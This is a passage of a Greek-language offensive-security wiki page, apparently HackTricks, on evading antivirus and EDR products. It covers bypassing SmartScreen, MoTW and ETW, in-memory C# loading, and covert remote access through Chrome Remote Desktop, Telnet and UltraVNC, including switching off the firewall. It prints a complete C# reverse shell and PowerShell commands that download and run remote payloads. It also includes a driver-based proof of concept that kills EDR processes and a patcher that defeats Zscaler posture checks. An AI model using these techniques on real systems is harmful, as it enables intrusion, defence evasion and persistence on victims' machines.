4.  Manual clean-up – τρέξε το τελικό binary μέσα στο dnSpy, ψάξε για μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσεις το *real* payload. Συχνά το malware το αποθηκεύει ως ένα TLV-encoded byte array που αρχικοποιείται μέσα στο `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά το execution flow **χωρίς** να χρειάζεται να τρέξεις το malicious sample – χρήσιμο όταν δουλεύεις σε offline workstation.

> 🛈  Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για να triage samples αυτόματα.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ο στόχος αυτού του project είναι να παρέχει ένα open-source fork της σουίτας μεταγλώττισης [LLVM](http://www.llvm.org/) ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): Το ADVobfuscator δείχνει πώς να χρησιμοποιήσεις τη γλώσσα `C++11/14` για να δημιουργήσεις, κατά το compile time, obfuscated code χωρίς τη χρήση εξωτερικού tool και χωρίς να τροποποιήσεις τον compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα layer of obfuscated operations που παράγεται από το C++ template metaprogramming framework, το οποίο θα κάνει τη ζωή του ατόμου που θέλει να crack την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Το Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα διαφορετικά pe files, including: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Το Metame είναι μια απλή metamorphic code engine για arbitrary executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): Το ROPfuscator είναι ένα fine-grained code obfuscation framework για γλώσσες που υποστηρίζονται από το LLVM και χρησιμοποιεί ROP (return-oriented programming). Το ROPfuscator obfuscates ένα πρόγραμμα σε επίπεδο assembly code, μετατρέποντας regular instructions σε ROP chains, thwarting τη φυσική μας αντίληψη του normal control flow.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Το Nimcrypt είναι ένα .NET PE Crypter γραμμένο σε Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Το Inceptor μπορεί να μετατρέψει υπάρχοντα EXE/DLL σε shellcode και στη συνέχεια να τα φορτώσει

## SmartScreen & MoTW

Ίσως να έχεις δει αυτή την οθόνη όταν κατεβάζεις κάποια executables από το internet και τα εκτελείς.

Το Microsoft Defender SmartScreen είναι ένας μηχανισμός ασφαλείας που προορίζεται να προστατεύει τον τελικό χρήστη από το να εκτελεί potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

Το SmartScreen λειτουργεί κυρίως με μια προσέγγιση βασισμένη στη reputation, που σημαίνει ότι εφαρμογές που κατεβαίνουν ασυνήθιστα θα ενεργοποιήσουν το SmartScreen, ειδοποιώντας έτσι και εμποδίζοντας τον τελικό χρήστη να εκτελέσει το αρχείο (αν και το αρχείο μπορεί ακόμη να εκτελεστεί κάνοντας κλικ στο More Info -> Run anyway).

**MoTW** (Mark of The Web) είναι ένα [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) με το όνομα Zone.Identifier το οποίο δημιουργείται αυτόματα όταν κατεβάζεις αρχεία από το internet, μαζί με το URL από το οποίο κατεβάστηκε.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> Είναι σημαντικό να σημειωθεί ότι executables που είναι signed με ένα **trusted** signing certificate **won't trigger SmartScreen**.

Ένας πολύ αποτελεσματικός τρόπος για να αποτρέψεις τα payloads σου από το να πάρουν το Mark of The Web είναι να τα πακετάρεις μέσα σε κάποιο container όπως ένα ISO. Αυτό συμβαίνει επειδή το Mark-of-the-Web (MOTW) **cannot** be applied σε **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

Το [**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) είναι ένα tool που πακετάρει payloads σε output containers για να evade το Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Εδώ είναι ένα demo για bypassing SmartScreen με συσκευασία payloads μέσα σε ISO files χρησιμοποιώντας [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Το Event Tracing for Windows (ETW) είναι ένας ισχυρός μηχανισμός logging στα Windows που επιτρέπει σε applications και system components να **log events**. Ωστόσο, μπορεί επίσης να χρησιμοποιηθεί από security products για να παρακολουθούν και να εντοπίζουν malicious activities.

Παρόμοια με το πώς το AMSI είναι disabled (bypassed), είναι επίσης δυνατό να κάνετε τη **`EtwEventWrite`** function της user space process να επιστρέφει αμέσως χωρίς να γίνεται logging οποιωνδήποτε events. Αυτό γίνεται με patching της function στη μνήμη ώστε να επιστρέφει αμέσως, απενεργοποιώντας ουσιαστικά το ETW logging για εκείνη τη process.

Μπορείτε να βρείτε περισσότερες πληροφορίες στο **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Το loading C# binaries στη μνήμη είναι γνωστό εδώ και αρκετό καιρό και παραμένει ένας πολύ καλός τρόπος για να τρέχετε τα post-exploitation tools σας χωρίς να σας πιάσει το AV.

Εφόσον το payload θα φορτωθεί απευθείας στη μνήμη χωρίς να αγγίξει το disk, θα χρειαστεί να ασχοληθούμε μόνο με patching του AMSI για ολόκληρη τη process.

Τα περισσότερα C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ήδη παρέχουν τη δυνατότητα να εκτελούνται C# assemblies απευθείας στη μνήμη, αλλά υπάρχουν διαφορετικοί τρόποι να γίνει αυτό:

- **Fork\&Run**

Περιλαμβάνει το **spawning μιας νέας sacrificial process**, injection του post-exploitation malicious code σας σε εκείνη τη νέα process, εκτέλεση του malicious code σας και όταν ολοκληρωθεί, τερματισμό της νέας process. Αυτό έχει τόσο τα πλεονεκτήματά του όσο και τα μειονεκτήματά του. Το πλεονέκτημα της fork and run μεθόδου είναι ότι η εκτέλεση γίνεται **outside** από τη Beacon implant process μας. Αυτό σημαίνει ότι αν κάτι πάει στραβά ή εντοπιστεί κατά τη διάρκεια της post-exploitation ενέργειάς μας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** το **implant μας να επιβιώσει.** Το μειονέκτημα είναι ότι έχετε **μεγαλύτερη πιθανότητα** να εντοπιστείτε από **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Πρόκειται για injection του post-exploitation malicious code **μέσα στην ίδια του τη process**. Με αυτόν τον τρόπο, μπορείτε να αποφύγετε τη δημιουργία νέας process και το scanning της από AV, αλλά το μειονέκτημα είναι ότι αν κάτι πάει στραβά με την εκτέλεση του payload σας, υπάρχει **πολύ μεγαλύτερη πιθανότητα** να **χάσετε το beacon σας** καθώς μπορεί να κρασάρει.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Αν θέλετε να διαβάσετε περισσότερα για το C# Assembly loading, δείτε αυτό το άρθρο [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) και το InlineExecute-Assembly BOF τους ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Μπορείτε επίσης να φορτώσετε C# Assemblies **from PowerShell**, δείτε το [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) και το [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Όπως προτείνεται στο [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), είναι δυνατό να εκτελέσετε malicious code χρησιμοποιώντας άλλες γλώσσες δίνοντας στο compromised machine πρόσβαση **to the interpreter environment installed on the Attacker Controlled SMB share**.

Επιτρέποντας πρόσβαση στα Interpreter Binaries και στο environment στο SMB share μπορείτε να **εκτελέσετε arbitrary code σε αυτές τις γλώσσες μέσα στη μνήμη** του compromised machine.

Το repo υποδεικνύει: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Το Token stomping είναι μια technique που επιτρέπει σε έναν attacker να **manipulate το access token ή ένα security prouct όπως ένα EDR ή AV**, επιτρέποντάς του να μειώσει τα privileges του ώστε η process να μην πεθάνει αλλά να μην έχει permissions για να ελέγχει malicious activities.

Για να το αποτρέψει αυτό, το Windows θα μπορούσε να **prevent external processes** από το να παίρνουν handles πάνω στα tokens των security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Όπως περιγράφεται σε [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), είναι εύκολο απλώς να εγκαταστήσετε το Chrome Remote Desktop σε έναν victim PC και μετά να το χρησιμοποιήσετε για να τον takeover και να διατηρήσετε persistence:
1. Κατεβάστε από https://remotedesktop.google.com/, κάντε κλικ στο "Set up via SSH", και μετά κάντε κλικ στο MSI file για Windows για να κατεβάσετε το MSI file.
2. Τρέξτε τον installer silently στο victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Επιστρέψτε στη σελίδα του Chrome Remote Desktop και κάντε κλικ next. Ο wizard θα σας ζητήσει στη συνέχεια να authorize; κάντε κλικ στο Authorize button για να συνεχίσετε.
4. Εκτελέστε το given parameter με κάποιες προσαρμογές: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Σημειώστε την παράμετρο pin που επιτρέπει να ορίσετε το pin without using the GUI).


## Advanced Evasion

Το Evasion είναι ένα πολύ περίπλοκο θέμα, μερικές φορές πρέπει να λάβετε υπόψη πολλές διαφορετικές πηγές telemetry σε μόνο ένα σύστημα, οπότε είναι πρακτικά αδύνατο να παραμείνετε εντελώς undetected σε mature environments.

Κάθε environment στο οποίο θα στοχεύσετε θα έχει τα δικά του πλεονεκτήματα και αδυναμίες.

Σας ενθαρρύνω πολύ να δείτε αυτή την ομιλία από τον [@ATTL4S](https://twitter.com/DaniLJ94), για να αποκτήσετε ένα foothold στις πιο Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Υπάρχει επίσης μια άλλη πολύ καλή ομιλία από τον [@mariuszbit](https://twitter.com/mariuszbit) σχετικά με το Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Μπορείτε να χρησιμοποιήσετε το [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) το οποίο θα **remove parts of the binary** μέχρι να **finds out which part Defender** εντοπίζει ως malicious και να σας το χωρίσει.\
Ένα άλλο tool που κάνει το **same thing is** το [**avred**](https://github.com/dobin/avred) με ένα ανοιχτό web offering the service στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows10, όλα τα Windows έρχονταν με έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως administrator) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Να το **ξεκινά** όταν το σύστημα εκκινείται και να το **τρέξει** τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή telnet port** (stealth) και απενεργοποίηση firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τα bin downloads, όχι το setup)

**ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον server:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε password στο _VNC Password_
- Ορίστε password στο _View-Only Password_

Έπειτα, μετακινήστε το binary _**winvnc.exe**_ και το **νεοδημιουργημένο** αρχείο _**UltraVNC.ini**_ μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** θα πρέπει να **εκτελέσει μέσα στον** δικό του **host** το binary `vncviewer.exe -listen 5900` ώστε να είναι **έτοιμο** να δεχτεί μια reverse **VNC connection**. Έπειτα, μέσα στο **victim**: Ξεκινήστε το winvnc daemon `winvnc.exe -run` και τρέξτε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Για να διατηρήσετε stealth δεν πρέπει να κάνετε μερικά πράγματα

- Μην ξεκινήσετε το `winvnc` αν ήδη εκτελείται, αλλιώς θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, αλλιώς θα προκαλέσει να ανοίξει το [config window](https://i.imgur.com/rfMQWcf.png)
- Μην τρέξετε `winvnc -h` για βοήθεια, αλλιώς θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκίνα το lister** με `msfconsole -r file.rc` και **εκτέλεσε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Compiling our own reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### First C# Revershell

Compile it with:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποίησέ το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρησιμοποιώντας compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρήση python για παραδείγματα build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Ο Storm-2603 αξιοποίησε ένα μικρό console utility γνωστό ως **Antivirus Terminator** για να απενεργοποιήσει τις προστασίες endpoint πριν ρίξει ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *signed* driver** και τον καταχράται για να εκτελεί privileged kernel operations που ακόμη και τα Protected-Process-Light (PPL) AV services δεν μπορούν να μπλοκάρουν.

Key take-aways
1. **Signed driver**: Το αρχείο που παραδίδεται στο disk είναι το `ServiceMouse.sys`, αλλά το binary είναι το νόμιμα signed driver `AToolsKrnl64.sys` από το “System In-Depth Analysis Toolkit” της Antiy Labs. Επειδή ο driver φέρει έγκυρο Microsoft signature φορτώνεται ακόμη και όταν το Driver-Signature-Enforcement (DSE) είναι ενεργό.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Η πρώτη γραμμή καταχωρεί τον driver ως **kernel service** και η δεύτερη τον εκκινεί ώστε το `\\.\ServiceMouse` να γίνει προσβάσιμο από το user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD παρακάμπτει πλήρως τις user-mode προστασίες· code που εκτελείται στο kernel μπορεί να ανοίξει *protected* processes, να τα τερματίσει ή να αλλοιώσει kernel objects ανεξάρτητα από τα PPL/PP, ELAM ή άλλα hardening features.

Detection / Mitigation
•  Ενεργοποιήστε το vulnerable-driver block list της Microsoft (`HVCI`, `Smart App Control`) ώστε τα Windows να αρνούνται να φορτώσουν το `AToolsKrnl64.sys`.
•  Παρακολουθείτε δημιουργίες νέων *kernel* services και κάνετε alert όταν ένας driver φορτώνεται από world-writable directory ή δεν υπάρχει στη allow-list.
•  Παρακολουθείτε για user-mode handles προς custom device objects που ακολουθούνται από ύποπτα `DeviceIoControl` calls.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Το **Client Connector** της Zscaler εφαρμόζει device-posture rules τοπικά και βασίζεται στο Windows RPC για να επικοινωνεί τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές κάνουν δυνατό ένα πλήρες bypass:

1. Η αξιολόγηση posture γίνεται **εξ ολοκλήρου client-side** (στέλνεται ένα boolean στον server).
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το executable που συνδέεται είναι **signed by Zscaler** (μέσω `WinVerifyTrust`).

Με το **patching τεσσάρων signed binaries on disk** και οι δύο μηχανισμοί μπορούν να εξουδετερωθούν:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Πάντα επιστρέφει `1` ώστε κάθε check να είναι compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαταστάθηκε από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλα** τα posture checks εμφανίζονται **πράσινα/compliant**.
* Unsigned ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Το compromised host αποκτά unrestricted access στο internal network που ορίζεται από τις Zscaler policies.

Αυτή η case study δείχνει πώς καθαρά client-side trust decisions και απλοί signature checks μπορούν να defeated με λίγα byte patches.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια signer/level hierarchy, ώστε μόνο processes με equal-or-higher προστασία να μπορούν να tamper με το ένα το άλλο. Offensive, αν μπορείς να εκκινήσεις νόμιμα ένα PPL-enabled binary και να ελέγξεις τα arguments του, μπορείς να μετατρέψεις benign functionality (π.χ. logging) σε ένα constrained, PPL-backed write primitive απέναντι σε protected directories που χρησιμοποιούνται από AV/EDR.

Τι κάνει ένα process να τρέχει ως PPL
- Το target EXE (και οποιαδήποτε loaded DLLs) πρέπει να είναι signed με ένα PPL-capable EKU.
- Το process πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τα flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί ένα compatible protection level που να ταιριάζει με τον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για anti-malware signers, `PROTECTION_LEVEL_WINDOWS` για Windows signers). Τα λάθος levels θα αποτύχουν κατά τη δημιουργία.

Δες επίσης μια πιο ευρεία εισαγωγή στο PP/PPL και στο LSASS protection εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (επιλέγει protection level και προωθεί arguments στο target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Το signed system binary `C:\Windows\System32\ClipUp.exe` self-spawns και δέχεται μία παράμετρο για να γράψει ένα log file σε ένα path που καθορίζει ο caller.
- Όταν εκκινείται ως PPL process, το file write γίνεται με PPL backing.
- Το ClipUp δεν μπορεί να κάνει parse paths που περιέχουν spaces· χρησιμοποίησε 8.3 short paths για να δείξεις σε κανονικά protected locations.

8.3 short path helpers
- Λίστα short names: `dir /x` σε κάθε parent directory.
- Derive short path σε cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS` χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Πέρασε το ClipUp log-path argument για να εξαναγκάσεις file creation σε ένα protected AV directory (π.χ., Defender Platform). Χρησιμοποίησε 8.3 short names αν χρειάζεται.
3) Αν το target binary είναι συνήθως open/locked by the AV ενώ τρέχει (π.χ., MsMpEng.exe), προγραμμάτισε το write στο boot πριν ξεκινήσει το AV εγκαθιστώντας ένα auto-start service που εκτελείται αξιόπιστα νωρίτερα. Επικύρωσε το boot ordering με Process Monitor (boot logging).
